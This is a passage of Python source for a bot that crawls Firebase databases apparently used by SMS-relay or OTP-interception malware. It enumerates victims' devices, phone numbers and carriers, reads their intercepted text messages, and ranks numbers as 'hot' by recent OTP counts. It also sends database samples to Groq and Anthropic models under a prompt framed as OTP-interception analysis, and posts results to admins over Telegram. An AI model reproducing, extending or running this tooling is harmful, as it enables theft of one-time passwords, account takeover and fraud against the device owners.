                    t = int(s)
                    if t > 1_000_000_000_000: t //= 1000
                    if 1_000_000_000 < t < 9_999_999_999:
                        ts = t; break
                elif len(s) > 5:
                    # Non-digit string date — normalize " | " separator then parse
                    t = _parse_sms_time_ts(s.replace(" | ", " "))
                    if t > 0:
                        ts = t; break

        if ts is None:
            # 2) Integer dict key itself is epoch-ms (e.g. tinmm88: key = "1781545311449")
            k_str = str(key).strip()
            if k_str.isdigit() and len(k_str) == 13:
                t = int(k_str) // 1000
                if 1_000_000_000 < t < 9_999_999_999:
                    ts = t

        if ts and (best is None or ts > best):
            best = ts
    return best


def _compute_hot_confidence(online: bool, recent_sms: bool, otp_count: int,
                            sms_age_min: float | None, hot_score: int) -> tuple[int, str]:
    """Compute 0-100 confidence score for a number being genuinely hot/active."""
    score = 0
    reasons = []
    if online:
        score += 35; reasons.append("online✓")
    if recent_sms:
        score += 20; reasons.append("recent-sms✓")
    if otp_count >= 5:
        score += 30; reasons.append(f"OTPs:{otp_count}")
    elif otp_count >= 2:
        score += 20; reasons.append(f"OTPs:{otp_count}")
    elif otp_count == 1:
        score += 10; reasons.append("OTP:1")
    if sms_age_min is not None:
        if sms_age_min <= 5:
            score += 15; reasons.append("sms<5m")
        elif sms_age_min <= 20:
            score += 10; reasons.append("sms<20m")
        elif sms_age_min <= 60:
            score += 5;  reasons.append("sms<1h")
    if hot_score > 50:
        score += 10; reasons.append("hot-score✓")
    elif hot_score > 0:
        score += 5
    return min(100, score), " · ".join(reasons) if reasons else "no-activity"


async def _auto_probe_number(device_id: str, fb_source: str, api_key=None):
    if not fb_source: return None, None
    base  = fb_source.replace(".json", "").rstrip("/")
    probe_paths = [
        f"{base}/All_Users/simDetails/{device_id}",
        f"{base}/All_Users/DeviceInfo/{device_id}",
        f"{base}/{device_id}",
        f"{base}/devices/{device_id}",
        f"{base}/Devices/{device_id}",
        f"{base}/All_Users/{device_id}",
        f"{base}/all_users/{device_id}",
        f"{base}/users/{device_id}",
        f"{base}/user/{device_id}",
        f"{base}/info/{device_id}",
        f"{base}/deviceInfo/{device_id}",
        f"{base}/device_info/{device_id}",
        f"{base}/simInfo/{device_id}",
        f"{base}/Numbers/{device_id}",
        f"{base}/clients/{device_id}",
        f"{base}/phones/{device_id}",
    ]
    def _check_node(data):
        if not isinstance(data, dict): return None, None
        for ph_field in ("sim1Number","sim2Number","simNumber","phoneNumber"):
            v = data.get(ph_field)
            if v:
                ph = _norm_phone(str(v))
                if ph:
                    ca = (data.get("sim1Provider") or data.get("sim2Provider")
                          or _extract_carrier_deep(data) or "")
                    return ph, ca
        ph = _extract_phone_deep(data)
        ca = _extract_carrier_deep(data)
        if ph: return ph, ca or ""
        for child in data.values():
            if isinstance(child, dict):
                ph2 = _extract_phone_deep(child)
                if ph2:
                    return ph2, _extract_carrier_deep(child) or ca or ""
        return None, None

    async with aiohttp.ClientSession() as sess:
        BATCH = 4
        for i in range(0, len(probe_paths), BATCH):
            batch   = probe_paths[i:i + BATCH]
            results = await asyncio.gather(
                *[fb_get(sess, p, timeout=3, api_key=api_key) for p in batch],
                return_exceptions=True)
            for data in results:
                if isinstance(data, Exception) or not isinstance(data, dict): continue
                ph, ca = _check_node(data)
                if ph: return ph, ca

        # ── SMS-entry fallback (Pattern G/H databases store device number inside SMS) ──
        # Fields that hold the DEVICE'S own SIM number (not the sender):
        _SIM_FIELDS = ("simNumber","phoneNumber","localNumber","ownNumber","devicePhone",
                       "recipientPhone","myPhone","to","recipientNumber","localPhone",
                       "simPhone","sim1Number","sim2Number","subscriberNumber","deviceNumber")
        for sms_root in ("sms","user_sms","sms_forward","messages"):
            sms_node = await fb_get(
                sess, f"{base}/{sms_root}/{device_id}.json?orderBy=%22%24key%22&limitToLast=10",
                api_key=api_key, timeout=4)
            if not isinstance(sms_node, dict): continue
            for entry in sms_node.values():
                if not isinstance(entry, dict): continue
                # 1) Check dedicated SIM-number fields
                for f in _SIM_FIELDS:
                    v = entry.get(f)
                    if v:
                        ph = _norm_phone(str(v))
                        if ph:
                            ca = _extract_carrier_deep(entry)
                            return ph, ca
                # 2) Scan SMS body text for embedded Indian mobile number
                #    (e.g. Jio messages: "Jio Number: 8795252441")
                body = (entry.get("message") or entry.get("body") or
                        entry.get("msg")     or entry.get("text") or "")
                ph = _phone_from_body(str(body))
                if ph:
                    return ph, ""
            # 3) Deep-extract from entire SMS node
            ph = _extract_phone_deep(sms_node)
            if ph:
                return ph, ""
    return None, None


# ══════════════════════════════════════════════════════════════
# FIREBASE STRUCTURE PARSERS  (A, A2, F, G, H, Y, Z, B, C, D, E)
# ══════════════════════════════════════════════════════════════

async def _pat_A(sess, base, api_key=None):
    shallow = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
    if not isinstance(shallow, dict): return None
    all_rows = []
    for rk in shallow:
        if rk in _FB_SYSTEM_KEYS: continue
        sim = await fb_get(sess, f"{base}/{rk}/All_User/SimINFO.json", api_key=api_key)
        if not isinstance(sim, dict): continue
        info = await fb_get(sess, f"{base}/{rk}/All_User/Info.json", api_key=api_key) or {}
        for dev_id, sd in sim.items():
            if not isinstance(sd, dict): continue
            dv      = (info.get(dev_id) or {}) if isinstance(info, dict) else {}
            name    = dv.get("Name", dev_id) if dv else dev_id
            st      = _status_str(dv.get("status", "Online")) if dv else "Active"
            carrier_found = _extract_carrier_deep(sd) or _extract_carrier_deep(dv)
            found_any = False
            for slot in ("sim1","sim2"):
                raw = sd.get(slot)
                if not raw: continue
                num = _norm_phone(str(raw).split(" - ")[0])
                if not num: num = _extract_phone_deep(sd)
                if not num: continue
                found_any = True
                carrier   = _carrier(raw) or carrier_found
                all_rows.append(dict(number=num, device_id=dev_id,
                    device_name=str(name), sim_slot=slot, carrier=carrier,
                    status=st, struct_type="A",
                    sms_path=f"{base}/{rk}/All_User/Sms/{dev_id}",
                    status_path=f"{base}/{rk}/All_User/Info/{dev_id}"))
            if not found_any:
                ph = _extract_phone_deep(sd) or _extract_phone_deep(dv)
                if ph:
                    all_rows.append(dict(number=ph, device_id=dev_id,
                        device_name=str(name), sim_slot="sim1", carrier=carrier_found,
                        status=st, struct_type="A",
                        sms_path=f"{base}/{rk}/All_User/Sms/{dev_id}",
                        status_path=f"{base}/{rk}/All_User/Info/{dev_id}"))
    return (all_rows, "A") if all_rows else None


async def _pat_A2(sess, base, root_keys, api_key=None):
    if "All_Users" not in root_keys: return None
    devs   = await fb_get(sess, f"{base}/All_Users/DeviceInfo.json?shallow=true", api_key=api_key)
    sms_sh = await fb_get(sess, f"{base}/All_Users/sms.json?shallow=true", api_key=api_key)
    if not isinstance(devs, dict): return None
    sms_ids = set(sms_sh.keys()) if isinstance(sms_sh, dict) else set()
    rows    = []
    for dev_id in devs:
        if dev_id not in sms_ids: continue
        di      = await fb_get(sess, f"{base}/All_Users/DeviceInfo/{dev_id}.json", api_key=api_key)
        name    = "Unknown"; st = "Active"; carrier = ""
        if isinstance(di, dict):
            name    = str(di.get("Model") or di.get("Brand") or dev_id[:12])
            st      = _status_str(di.get("Status") or di.get("status", "Online"))
            carrier = _extract_carrier_deep(di)
            ph      = _extract_phone_deep(di)
        else: ph = None
        rows.append(dict(number=ph or f"DEV-{dev_id}", device_id=dev_id,
            device_name=name, sim_slot="sim1", carrier=carrier, status=st,
            struct_type="A2",
            sms_path=f"{base}/All_Users/sms/{dev_id}",
            status_path=f"{base}/All_Users/DeviceInfo/{dev_id}"))
    return (rows, "A2") if rows else None


async def _pat_F(sess, base, root_keys, api_key=None):
    if "sms" not in root_keys or "admin" not in root_keys: return None
    cfs = await fb_get(sess, f"{base}/admin/callForwardingStatus.json?shallow=true", api_key=api_key)
    if not isinstance(cfs, dict): return None
    rows = []; seen = set()
    for dev_id in cfs:
        ents = await fb_get(sess, f"{base}/admin/callForwardingStatus/{dev_id}.json", api_key=api_key)
        if not isinstance(ents, dict): continue
        phone = None
        for v in ents.values():
            if isinstance(v, dict):
                fn = v.get("forwardNumber")
                if fn: phone = _norm_phone(str(fn)); break
        if not phone: phone = _extract_phone_deep(ents)
        if phone and dev_id not in seen:
            seen.add(dev_id)
            rows.append(dict(number=phone, device_id=dev_id,
                device_name=dev_id[:12], sim_slot="sim1", carrier="", status="Active",
                struct_type="F",
                sms_path=f"{base}/sms/{dev_id}",
                status_path=f"{base}/admin/callForwardingStatus/{dev_id}"))
    return (rows, "F") if rows else None


async def _pat_G(sess, base, root_keys, api_key=None):
    sms_key = next((k for k in ("user_sms","sms","sms_forward") if k in root_keys), None)
    dev_key = next((k for k in ("user_data","user_list") if k in root_keys), None)
    if not sms_key: return None
    sms_sh  = await fb_get(sess, f"{base}/{sms_key}.json?shallow=true", api_key=api_key)
    if not isinstance(sms_sh, dict) or not sms_sh: return None
    dev_names = {}; dev_phones = {}; dev_carriers = {}
    if dev_key:
        dev_sh = await fb_get(sess, f"{base}/{dev_key}.json?shallow=true", api_key=api_key)
        if isinstance(dev_sh, dict):
            for did in dev_sh.keys():
                if did in _FB_SYSTEM_KEYS: continue
                dd = await fb_get(sess, f"{base}/{dev_key}/{did}.json", api_key=api_key)
                if isinstance(dd, dict):
                    dev_names[did]    = str(dd.get("d_name") or dd.get("name") or did[:12])
                    dev_phones[did]   = _extract_phone_deep(dd)
                    dev_carriers[did] = _extract_carrier_deep(dd)

    # ── No dev_key? Look harder for phone numbers ──────────────────────────
    # Step 1: Check alternative info root paths present in this database
    _INFO_ROOTS = ("clients","devices","device","info","device_info","deviceInfo",
                   "users","user_info","phones","phone","Numbers","simInfo")
    for info_rk in _INFO_ROOTS:
        if info_rk not in root_keys: continue
        for did in list(sms_sh.keys())[:50]:
            if did in dev_phones: continue
            dd = await fb_get(sess, f"{base}/{info_rk}/{did}.json", api_key=api_key)
            if isinstance(dd, dict):
                ph = _extract_phone_deep(dd)
                if ph:
                    dev_phones[did]   = ph
                    dev_names[did]    = str(dd.get("name") or dd.get("d_name") or did[:12])
                    dev_carriers[did] = _extract_carrier_deep(dd)

    # Step 2: For still-unresolved devices, sample SMS entries for a device-number field.
    # Many relay apps embed the SIM card number inside each SMS entry as simNumber/phoneNumber/to.
    _SIM_FIELDS = ("simNumber","phoneNumber","localNumber","ownNumber","devicePhone",
                   "recipientPhone","myPhone","to","recipientNumber","localPhone","simPhone",
                   "sim1Number","sim2Number","subscriberNumber","deviceNumber")
    unknown = [d for d in sms_sh if d not in dev_phones]
    for did in unknown[:40]:
        sms_node = await fb_get(
            sess, f"{base}/{sms_key}/{did}.json?orderBy=%22%24key%22&limitToLast=3",
            api_key=api_key)
        if not isinstance(sms_node, dict): continue
        found_ph = None
        for sms_entry in sms_node.values():
            if not isinstance(sms_entry, dict): continue
            for f in _SIM_FIELDS:
                v = sms_entry.get(f)
                if v:
                    ph = _norm_phone(str(v))
                    if ph: found_ph = ph; break
            if found_ph: break
        if found_ph:
            dev_phones[did] = found_ph
        else:
            # Last resort: deep-extract from the full SMS node
            ph = _extract_phone_deep(sms_node)
            if ph: dev_phones[did] = ph

    rows = []
    for dev_id in sms_sh:
        ph = dev_phones.get(dev_id) or f"DEV-{dev_id}"
        rows.append(dict(number=ph, device_id=dev_id,
            device_name=dev_names.get(dev_id, dev_id[:12]),
            sim_slot="sim1", carrier=dev_carriers.get(dev_id, ""), status="Active",
            struct_type="G",
            sms_path=f"{base}/{sms_key}/{dev_id}",
            status_path=f"{base}/{dev_key}/{dev_id}" if dev_key else base))
    return (rows, "G") if rows else None


_BODY_PHONE_RE = re.compile(
    r'(?:'
    r'(?:Jio|Mobile|Phone|SIM|My|Your|Subscriber|Account)\s+'
    r'(?:Number|No\.?|नंबर|नं)\s*[:\-–]?\s*'
    r')?'
    r'(\+?91)?([6-9]\d{9})'
)

def _phone_from_body(body: str):
    """Extract an Indian mobile number embedded in an SMS message body."""
    if not body: return None
    # Strip URLs first so we don't match phone-like digits in URLs
    clean = re.sub(r'https?://\S+', '', body)
    m = _BODY_PHONE_RE.search(clean)
    if m:
        digits = m.group(2)
        return "+91" + digits
    return None


async def _pat_H(sess, base, root_keys, api_key=None):
    if "messages" not in root_keys: return None
    msg_sh  = await fb_get(sess, f"{base}/messages.json?shallow=true", api_key=api_key)
    if not isinstance(msg_sh, dict): return None
    dev_key = next((k for k in ("userdata","clients","users") if k in root_keys), None)
    rows    = []
    for dev_id in msg_sh:
        name = dev_id[:12]; carrier = ""; ph = None; st = "Active"; battery = ""
        if dev_key:
            dd = await fb_get(sess, f"{base}/{dev_key}/{dev_id}.json", api_key=api_key)
            if isinstance(dd, dict):
                name    = str(dd.get("name") or dd.get("d_name") or dd.get("deviceName") or name)
                ph      = _extract_phone_deep(dd)
                carrier = _extract_carrier_deep(dd)
                battery = str(dd.get("battery") or "")
                raw_st  = dd.get("status")
                if raw_st is not None:
                    st = ("Active"
                          if str(raw_st).lower() in ("true","1","online","active","yes")
                          else "Inactive")

        # ── Phone not in device-info node? Scan SMS bodies (e.g. "Jio Number: XXXXXXXXXX") ──
        if not ph:
            sms_sample = await fb_get(
                sess,
                f"{base}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=10",
                api_key=api_key)
            if isinstance(sms_sample, dict):
                for sms_entry in sms_sample.values():
                    if not isinstance(sms_entry, dict): continue
                    body = (sms_entry.get("message") or sms_entry.get("body") or
                            sms_entry.get("msg")     or sms_entry.get("text") or "")
                    ph = _phone_from_body(str(body))
                    if ph: break

        dev_name_display = name
        if battery:
            dev_name_display = f"{name} 🔋{battery}"

        rows.append(dict(number=ph or f"DEV-{dev_id}", device_id=dev_id,
            device_name=dev_name_display, sim_slot="sim1",
            carrier=carrier, status=st,
            struct_type="H",
            sms_path=f"{base}/messages/{dev_id}",
            status_path=f"{base}/{dev_key}/{dev_id}" if dev_key else base))
    return (rows, "H") if rows else None


async def _pat_Y(sess, base, root_keys, api_key=None):
    sms_keys = root_keys - _FB_SYSTEM_KEYS
    if len(sms_keys) < 1 or len(sms_keys) > 200: return None
    rows = []
    for rk in list(sms_keys)[:100]:
        node    = await fb_get(sess, f"{base}/{rk}.json", api_key=api_key)
        if not isinstance(node, dict): continue
        ph      = _extract_phone_deep(node)
        carrier = _extract_carrier_deep(node)
        name    = str(node.get("Name") or node.get("name") or
                      node.get("deviceName") or node.get("device_name") or rk[:14])
        st      = _status_from_node(node)
        sms_sub = next((node.get(k) for k in ("sms","Sms","SMS","messages") if node.get(k)), None)
        if ph or sms_sub:
            rows.append(dict(number=ph or f"DEV-{rk}", device_id=rk,
                device_name=name, sim_slot="sim1", carrier=carrier, status=st,
                struct_type="Y",
                sms_path=f"{base}/{rk}/sms",
                status_path=f"{base}/{rk}"))
    return (rows, "Y") if rows else None


async def _pat_Z(sess, base, root_keys, api_key=None):
    sms_keys = root_keys - _FB_SYSTEM_KEYS
    if not sms_keys: return None
    rows = []; seen = set()
    for rk in list(sms_keys)[:200]:
        try:
            node    = await fb_get(sess, f"{base}/{rk}.json", api_key=api_key, timeout=10)
            if not isinstance(node, dict): continue
            ph      = _extract_phone_deep(node)
            carrier = _extract_carrier_deep(node)
            if not ph:
                child_keys = [k for k in node if k not in _FB_SYSTEM_KEYS][:15]
                for ck in child_keys:
                    child = node.get(ck)
                    if isinstance(child, dict):
                        ph      = ph or _extract_phone_deep(child)
                        carrier = carrier or _extract_carrier_deep(child)
                        if ph: break
                    elif isinstance(child, (str, int)):
                        cand = str(child).strip()
                        if _PH_RE.match(cand):
                            ph = _norm_phone(cand); break
            name    = str(node.get("Name") or node.get("name") or
                         node.get("deviceName") or node.get("device_name") or
                         node.get("model") or node.get("Model") or rk[:16])
            st      = _status_from_node(node)
            sms_sub = None
            for sk in ("sms","Sms","SMS","messages","Messages","inbox","received"):
                if sk in node: sms_sub = f"{base}/{rk}/{sk}"; break
            number_key = ph or f"DEV-{rk}"
            if number_key not in seen:
                seen.add(number_key)
                rows.append(dict(number=number_key, device_id=rk,
                    device_name=name, sim_slot="sim1", carrier=carrier or "",
                    status=st, struct_type="Z",
                    sms_path=sms_sub or f"{base}/{rk}/sms",
                    status_path=f"{base}/{rk}"))
        except Exception as e:
            log.debug("_pat_Z rk=%s err=%s", rk, e)
    return (rows, "Z") if rows else None


def _sim_entries_from(data, base, struct):
    rows = []
    if not isinstance(data, dict): return rows
    for dev_id, dd in data.items():
        if not isinstance(dd, dict): continue
        name    = str(dd.get("Name") or dd.get("name") or dev_id)
        st      = _status_str(dd.get("status", "Online"))
        carrier = _extract_carrier_deep(dd)
        found   = False
        for slot in ("sim1","sim2","SIM1","SIM2"):
            raw = dd.get(slot)
            if not raw: continue
            num = _norm_phone(str(raw).split(" - ")[0])
            if not num: continue
            found = True
            rows.append(dict(number=num, device_id=dev_id, device_name=name,
                sim_slot=slot.lower(), carrier=_carrier(raw) or carrier, status=st,
                struct_type=struct,
                sms_path=f"{base}/{dev_id}/sms",
                status_path=f"{base}/{dev_id}"))
        if not found:
            ph = _extract_phone_deep(dd)
            if ph:
                rows.append(dict(number=ph, device_id=dev_id, device_name=name,
                    sim_slot="sim1", carrier=carrier, status=st, struct_type=struct,
                    sms_path=f"{base}/{dev_id}/sms",
                    status_path=f"{base}/{dev_id}"))
    return rows


def _pat_E(full_data, base):
    rows = []; seen = set()
    def scan(node, path, d=0):
        if d > 8 or not isinstance(node, dict): return
        for k, v in node.items():
            cur = f"{path}/{k}" if path else k
            if isinstance(v, (str, int)):
                s = str(v).strip()
                if _PH_RE.match(s):
                    ph = _norm_phone(s)
                    if ph and ph not in seen:
                        seen.add(ph)
                        parent = "/".join(cur.split("/")[:-1]) if "/" in cur else ""
                        dev_id = path.split("/")[-1] if "/" in path else cur
                        rows.append(dict(number=ph, device_id=dev_id,
                            device_name=dev_id[:12], sim_slot="sim1",
                            carrier="", status="Active", struct_type="E",
                            sms_path=f"{base}/{parent}/sms" if parent else f"{base}/sms",
                            status_path=f"{base}/{parent}" if parent else base))
            elif isinstance(v, dict): scan(v, cur, d + 1)
    scan(full_data, "")
    return (rows, "E") if rows else (None, None)


# ══════════════════════════════════════════════════════════════
# GROQ AI — STRUCTURE LEARNING (inside relay)
# ══════════════════════════════════════════════════════════════

_AI_SYSTEM_PROMPT = """You are an elite Firebase Realtime Database forensic analyst specializing in SMS relay and OTP interception systems.

Your task: analyze a Firebase database sample and identify the EXACT structure so SMS messages and phone numbers can be extracted.

KNOWN PATTERNS (use as reference):
- Pattern G: user_sms/{device_id}/{sms_key}, user_data/{device_id} (phone in user_data)
- Pattern A: {ns}/All_User/SimINFO/{dev_id} (phone in sim1/sim2 field), {ns}/All_User/Sms/{dev_id}
- Pattern A2: All_Users/DeviceInfo/{dev_id} (phone field), All_Users/sms/{dev_id}
- Pattern A3: All_Users/simDetails/{dev_id} (sim1Number/sim2Number), All_Users/sms/{dev_id}
- Pattern H: messages/{device_id}/{sms_key}, clients/{device_id} (phone)
- Pattern J: smsLogs/{device_id}/{key} (receiverNumber in each SMS), registeredDevices/{device_id}
- Pattern K: csc/{device_id}/sms/{key}, csc/{device_id}/simInfo (phone)

Return ONLY valid JSON (no markdown fences, no explanation outside JSON):
{
  "pattern_id": "AI-1",
  "devices_root": "root key that lists all device IDs (e.g. user_sms, All_Users/sms, messages)",
  "phone_field": "exact field name holding the phone number inside each device node, or null if phone is in SMS body",
  "phone_path_template": "full path template to fetch phone node e.g. 'user_data/{device_id}' or null",
  "sms_root": "path template for SMS node e.g. 'user_sms/{device_id}' or 'messages/{device_id}'",
  "sms_body_field": "field name for SMS body e.g. 'body' or 'message'",
  "sms_sender_field": "field name for sender e.g. 'sender' or 'from'",
  "sms_time_field": "field name for timestamp e.g. 'timestamp' or 'dateTime'",
  "status_root": "path template to device status node or null",
  "status_field": "field name for online/offline status or null",
  "network_field": "field name for carrier/network operator e.g. 'operator' or 'carrier' or null",
  "confidence": 0.95,
  "notes": "brief explanation of what was found and any issues"
}

IMPORTANT: Be precise. Wrong paths waste API calls. If confidence < 0.5, still return best guess with low confidence score."""


async def _groq_learn_structure(base: str, api_key: str = None) -> tuple:
    """
    Use Groq to learn unknown Firebase structure. Returns (entries_list, pattern, error).
    Reads Groq key and model from DB settings.
    """
    groq_key     = _get_groq_key()
    anthropic_key = _get_anthropic_key()
    model_name   = _get_groq_model()
    host_slug    = re.sub(r'[^\w.-]', '_',
                          base.replace("https://","").replace("http://","").split("/")[0])

    if not groq_key and not anthropic_key:
        return [], {}, "No AI key configured. Set via /admin → ⚙ System → 🤖 AI Config"

    # Sample the database
    sample = {}
    async with aiohttp.ClientSession() as sess:
        root = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
        if not isinstance(root, dict):
            return [], {}, "Cannot connect to database"
        sample["_root_keys"] = list(root.keys())
        for rk in list(root.keys())[:5]:
            if rk in _FB_SYSTEM_KEYS: continue
            node_sh = await fb_get(sess, f"{base}/{rk}.json?shallow=true", api_key=api_key)
            if isinstance(node_sh, dict):
                sample[rk] = {"_shallow": list(node_sh.keys())[:10]}
                for child_id in list(node_sh.keys())[:2]:
                    child = await fb_get(sess, f"{base}/{rk}/{child_id}.json", api_key=api_key)
                    if isinstance(child, dict):
                        sub = {ck: ({k: v for k, v in list(cv.items())[:4]}
                                    if isinstance(cv, dict) else cv)
                               for ck, cv in list(child.items())[:8]}
                        sample[rk][child_id] = sub
                    break

    prompt = f"Firebase database sample:\n\n{json.dumps(sample, indent=2, default=str)[:6000]}"

    pattern = None
    ai_used = None
    err_msg = None

    if groq_key:
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                    f"{GROQ_BASE_URL}/chat/completions",
                    headers={"Authorization": f"Bearer {groq_key}",
                             "Content-Type": "application/json"},
                    json={"model": model_name,
                          "messages": [{"role":"system","content":_AI_SYSTEM_PROMPT},
                                       {"role":"user","content":prompt}],
                          "temperature": 0.1, "max_tokens": 800},
                    timeout=aiohttp.ClientTimeout(total=45),
                ) as r:
                    if r.status == 200:
                        data    = await r.json(content_type=None)
                        content = data["choices"][0]["message"]["content"].strip()
                        content = re.sub(r'<think>.*?</think>', '', content, flags=re.DOTALL)
                        content = re.sub(r'^```[a-z]*\n?', '', content.strip())
                        content = re.sub(r'\n?```$', '', content)
                        pattern = json.loads(content)
                        ai_used = f"Groq/{model_name}"
                    else:
                        err_msg = f"Groq HTTP {r.status}"
        except Exception as e:
            err_msg = f"Groq error: {e}"
            log.warning("[AI] Groq failed: %s", e)

    if pattern is None and anthropic_key:
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                    f"{ANTHROPIC_BASE}/messages",
                    headers={"x-api-key": anthropic_key,
                             "anthropic-version": "2023-06-01",
                             "Content-Type": "application/json"},
                    json={"model": "claude-haiku-4-5", "max_tokens": 800,
                          "system": _AI_SYSTEM_PROMPT,
                          "messages": [{"role":"user","content":prompt}]},
                    timeout=aiohttp.ClientTimeout(total=45),
                ) as r:
                    if r.status == 200:
                        data    = await r.json(content_type=None)
                        content = data["content"][0]["text"].strip()
                        content = re.sub(r'^```[a-z]*\n?', '', content)
                        content = re.sub(r'\n?```$', '', content)
                        pattern = json.loads(content)
                        ai_used = "Anthropic/claude-haiku-4-5"
                    else:
                        err_msg = f"Anthropic HTTP {r.status}"
        except Exception as e:
            err_msg = f"Anthropic error: {e}"
            log.warning("[AI] Anthropic failed: %s", e)

    if pattern is None:
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid,
                    f"🤖 <b>AI Learning Failed</b>\n"
                    f"<code>{host_slug}</code>\n{err_msg or 'All providers failed'}")
            except Exception: pass
        return [], {}, err_msg or "All AI providers failed"

    # Parse with learned pattern
    confidence = float(pattern.get("confidence", 0.0))
    devices_root = pattern.get("devices_root", "")
    sms_root_tpl = pattern.get("sms_root", "")
    phone_field  = pattern.get("phone_field")
    entries      = []

    if devices_root and sms_root_tpl:
        async with aiohttp.ClientSession() as sess:
            sh = await fb_get(sess, f"{base}/{devices_root}.json?shallow=true", api_key=api_key)
            if isinstance(sh, dict):
                for dev_id in list(sh.keys())[:300]:
                    if dev_id in _FB_SYSTEM_KEYS: continue
                    ph = carrier = ""
                    if phone_field:
                        ph_tpl  = pattern.get("phone_path_template", f"{devices_root}/{{device_id}}")
                        node    = await fb_get(
                            sess, f"{base}/{ph_tpl.replace('{device_id}', dev_id)}.json",
                            api_key=api_key) or {}
                        if isinstance(node, dict):
                            raw     = node.get(phone_field, "")
                            ph      = _norm_phone(str(raw)) if raw else _extract_phone_deep(node) or ""
                            carrier = _extract_carrier_deep(node)
                    sms_path = sms_root_tpl.replace("{device_id}", dev_id)
                    entries.append({
                        "number": ph or f"DEV-{dev_id}", "device_id": dev_id,
                        "device_name": dev_id[:40], "sim_slot": "sim1",
                        "carrier": carrier, "status": "Active",
                        "struct_type": f"AI-{pattern.get('pattern_id','?')}",
                        "sms_path": f"{base}/{sms_path}", "status_path": "",
                        "is_ghost": not bool(ph),
                    })

    # Save pattern to learned_patterns dir
    import os
    lp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "learned_patterns")
    os.makedirs(lp_dir, exist_ok=True)
    lp_path = os.path.join(lp_dir, f"{host_slug}.json")
    pattern["db_host"]    = host_slug
    pattern["learned_at"] = _now_ist().isoformat()
    try:
        with open(lp_path, "w") as f:
            json.dump(pattern, f, indent=2)
    except Exception as e:
        log.warning("[AI] Could not save pattern: %s", e)

    real_n  = sum(1 for e in entries if not e.get("is_ghost"))
    ghost_n = sum(1 for e in entries if e.get("is_ghost"))
    conf_bar = "█" * int(confidence * 10) + "░" * (10 - int(confidence * 10))
    conf_icon = "🟢" if confidence >= 0.8 else ("🟡" if confidence >= 0.5 else "🔴")

    alert = (
        f"🧠 <b>New Structure Learned!</b>\n\n"
        f"🗄 <b>DB:</b> <code>{host_slug}</code>\n"
        f"🤖 <b>AI:</b> {ai_used}\n"
        f"🔖 <b>Pattern:</b> {pattern.get('pattern_id','AI-?')}\n"
        f"📱 <b>SMS path:</b> <code>{pattern.get('sms_root','?')}</code>\n"
        f"📞 <b>Phone field:</b> {pattern.get('phone_field') or '❌ Not stored'}\n"
        f"📊 <b>Devices:</b> {len(entries)} · 🟢 {real_n} real · 👻 {ghost_n} ghost\n\n"
        f"{conf_icon} <b>Confidence:</b> {confidence:.0%}\n"
        f"<code>[{conf_bar}]</code>\n\n"
        f"📝 {pattern.get('notes','')}"
    )
    for aid in ADMIN_IDS:
        try: await bot.send_message(aid, alert)
        except Exception: pass

    return entries, pattern, None


def _load_learned(base: str):
    import os, json as _json
    host_slug = re.sub(r'[^\w.-]', '_',
                       base.replace("https://","").replace("http://","").split("/")[0])
    lp_dir  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "learned_patterns")
    lp_path = os.path.join(lp_dir, f"{host_slug}.json")
    if not os.path.exists(lp_path): return None
    try:
        with open(lp_path) as f:
            return _json.load(f)
    except Exception:
        return None


# ══════════════════════════════════════════════════════════════
# MASTER DETECTOR
# ══════════════════════════════════════════════════════════════

async def detect_firebase(sess, url, api_key=None):
    """Try all patterns. Returns (entries_list, struct_type, error_or_None)."""
    base = url.replace(".json","").rstrip("/")

    # Check learned patterns first
    learned = _load_learned(base)
    if learned:
        devices_root = learned.get("devices_root","")
        sms_root_tpl = learned.get("sms_root","")
        phone_field  = learned.get("phone_field")
        if devices_root and sms_root_tpl:
            sh = await fb_get(sess, f"{base}/{devices_root}.json?shallow=true", api_key=api_key)
            if isinstance(sh, dict):
                rows = []
                for dev_id in list(sh.keys())[:300]:
                    if dev_id in _FB_SYSTEM_KEYS: continue
                    ph = ""
                    if phone_field:
                        ph_tpl = learned.get("phone_path_template", f"{devices_root}/{{device_id}}")
                        node   = await fb_get(
                            sess, f"{base}/{ph_tpl.replace('{device_id}', dev_id)}.json",
                            api_key=api_key) or {}
                        if isinstance(node, dict):
                            raw = node.get(phone_field,"")
                            ph  = _norm_phone(str(raw)) if raw else _extract_phone_deep(node) or ""
                    sms_p = sms_root_tpl.replace("{device_id}", dev_id)
                    rows.append(dict(
                        number=ph or f"DEV-{dev_id}", device_id=dev_id,
                        device_name=dev_id[:40], sim_slot="sim1", carrier="",
                        status="Active",
                        struct_type=f"AI-{learned.get('pattern_id','?')}",
                        sms_path=f"{base}/{sms_p}", status_path="",
                    ))
                if rows:
                    return rows, f"AI-{learned.get('pattern_id','?')}", None

    code, _ = await fb_ping(sess, base, api_key=api_key)
    if code in (401, 403): return [], "?", "Access Denied (needs auth token)"
    if code in (423,):     return [], "?", "Database locked/disabled"
    if code == 0:          return [], "?", "Could not connect (timeout/network)"
    if code != 200:        return [], "?", f"HTTP {code} error"

    shallow = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
    if not isinstance(shallow, dict): return [], "?", "Could not read Firebase root"
    root_keys = set(shallow.keys()) - _FB_SYSTEM_KEYS

    r = await _pat_A(sess, base, api_key)
    if r: return r[0], r[1], None

    r = await _pat_A2(sess, base, root_keys, api_key)
    if r: return r[0], r[1], None

    r = await _pat_F(sess, base, root_keys, api_key)
    if r: return r[0], r[1], None

    r = await _pat_H(sess, base, root_keys, api_key)
    if r: return r[0], r[1], None

    r = await _pat_G(sess, base, root_keys, api_key)
    if r: return r[0], r[1], None

    r = await _pat_Y(sess, base, root_keys, api_key)
    if r: return r[0], r[1], None

    r = await _pat_Z(sess, base, root_keys, api_key)
    if r: return r[0], r[1], None

    if len(root_keys) > 200:
        return [], "?", f"Database too large ({len(root_keys)} root keys)"

    full = await fb_get(sess, f"{base}/.json", api_key=api_key)
    if isinstance(full, dict):
        for rk, rv in full.items():
            if not isinstance(rv, dict): continue
            for ck in ("devices","Devices","device","Device"):
                devs = rv.get(ck)
                rows = _sim_entries_from(devs, f"{base}/{rk}/{ck}", "B")
                if rows: return rows, "B", None
            rows = _sim_entries_from(rv, f"{base}/{rk}", "D")
